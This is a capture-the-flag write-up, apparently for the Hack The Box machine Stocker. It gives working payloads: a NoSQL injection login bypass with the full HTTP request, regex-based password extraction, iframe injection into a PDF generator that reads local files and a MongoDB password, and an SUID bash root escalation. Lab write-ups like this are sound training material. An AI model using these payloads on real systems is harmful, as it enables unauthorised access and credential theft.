### IP
`10.10.11.196`

# Reconnaissaince

### nmap

`nmap -sC -sV 10.10.11.196`
```
Nmap scan report for 10.10.11.196
Host is up (0.075s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
There isn't much here. Looking through the page source, there isn't much interesting apart from a vague comment about being able to login on a new page. 

We can add `stocker.htb` to `/etc/hosts`

### gobuster dir

`gobuster dir -u http://stocker.htb/ -w /usr/share/wordlists/dirbuster/director`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://stocker.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/06 15:06:51 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 178] [--> http://stocker.htb/img/]
/css                  (Status: 301) [Size: 178] [--> http://stocker.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://stocker.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://stocker.htb/fonts/]
===============================================================
2023/05/06 15:09:26 Finished
===============================================================

```

We don't find much, so I decide to do subdomain enumeration:

### gobuster vhost

Because the machine doesn't have DNS, we enumerate vhosts instead by parsing subdomains and looking for content on those pages

`gobuster vhost -u http://stocker.htb/ -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt --append-domain -t 100`

```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb/
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/05/06 15:10:53 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
===============================================================
2023/05/06 15:12:00 Finished
===============================================================

```

We find a dev subdomain with a login page.


# NoSQL Injection

Because we didn't really find much information about technologies on most of the website, we can try to force a 404 by going to a random page (eg. `http://dev.stocker.htb/kjskdj`)

When we do this, we get the following error:

`Cannot GET /kjskdj`

If we look this up, we find references to NodeJS, which typically uses mongodb and other NoSQL databases. 

I stored the request made by logging in using burp to use for fuzzing purposes.

We can fuzz using the following script:

`ffuf -u http://dev.stocker.htb/login -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -request login.req -mc all`

It looks like every payload has the same response, so we can assume that none of them worked. 

I also tried fuzzing for bad characters but that didn't get any interesting results either:

`ffuf -request input.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all`


As a result, I resorted to modifying the payload inside of the original request in burp.


Currently, the contents of the login credentials are stored as following:

```js
username=fakseUser&password=fakePass
```

If the website was using PHP, we could attempt a NoSQL injection by changing it to something like

```js
username[$ne]=fakeUser&password[$ne]=fakePass
````
Here, `$ne` represents the `not equal` operator. This is one of many operators we can use, which includes `$gt`, `$lt`, `$regex`...


However, since the websites are html and nodejs doesn't allow that kind of format, we want to change the payload to use a json format.

To do this, we change the `Content-Type` to `application/json`

We then can set the payload to the following:

```json
{"username":{"$ne":""}, "password":{"$ne":""}}
```

This looks for anything where the username is not empty and the password is not empty (ie. probably everything)

We can verify that the form is expecting json, because when we send the payload without the `password` variable, we get a `JSON.parse` error


However, sending the full payload logs us in:

```http
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3ANPSKz6DZmI0iZkYyW8n3z23AesUGW8vq.mkv1OI9JhxqpWU2Jb%2BWjStPVjSnh3f%2FjInJ38dNsdNE
Connection: close

{"username":{"$ne":""}, "password":{"$ne":""}}
```

We can also use the `$regex` operator to figure out the username and password byte-by-byte

The following payload tells us that the username has seven characters:

```json
{"username":{"$regex":"......."}, "password":{"$ne":""}}
```

Adding any more dots will result in a login error

We can then do something like `a......` and `b......` until we find the the first character and so on.

I found the username to be `angoose`

Similarly, we can find the password to be 32 characters. Because this is harder to do by hand, I wrote a script called `brute.py`

Running it, I get a password of `b3e795719e2a644f69838a593dd159ac`. I thought this would be a hash, but it turns out that it is the actual password. 

`angoose:b3e795719e2a644f69838a593dd159ac`

I tried these credentials for SSH but they didn't work. I also tried cracking the hash and wasn't able to. Based on this, we probably need to do some further exploitation on the web. 

# Local File Inclusion

When we add items to the cart and check out, we get a PDF

Since this is dynamically generated, it may be possible to include local files.

Indeed, one of the requests has an image file:

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a91",
      "title": "Axe",
      "description": "It's an axe.",
      "image": "axe.jpg",
      "price": 12,
      "currentStock": 21,
      "__v": 0,
      "amount": 2
    }
  ]
}
```
Unfortunately, changing this image file to something like `/etc/passwd` doesn't work. We also seem to be unable to see the image in the pdf regardless.

To learn more about the pdf, we can download it and run `exiftool` 

Here, we can see a `Producer` of `Skia/PDF m108`

Looking it up, I found that we can do XSS on the PDF. [source](https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file)

More specifically, we can change text to an iframe to include local files as such:


```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a91",
      "title": "<iframe src=/etc/passwd>",
      "description": "It's an axe.",
      "image": "axe.jpg",
      "price": 12,
      "currentStock": 21,
      "__v": 0,
      "amount": 2
    }
  ]
}

```

Because the output is too small, we can also change the width and height:

```
<iframe src=/etc/passwd height=1000 width=500>
```

Once we've done this, we can once again see the `angoose` user

We can then traverse the files until we find `/var/www/dev/index.js`, in which we find the database URI as:

```js
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost"
```

We now have the password:

`angoose:IHeardPassphrasesArePrettySecure`

We can use this to log in through ssh and get the user flag

# Privilege Escalation

Running `sudo -l` gets us the following:

```
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

This doesn't do much for us, since the files that angoose can operate on are only writable by root.

However, we can look for suid binaries with `find / -perm -u=s -type f 2>/dev/null`

This shows us that `bash` is an suid binary

This means we can run `bash -p` to get a privileged shell.

We can then get the root flag
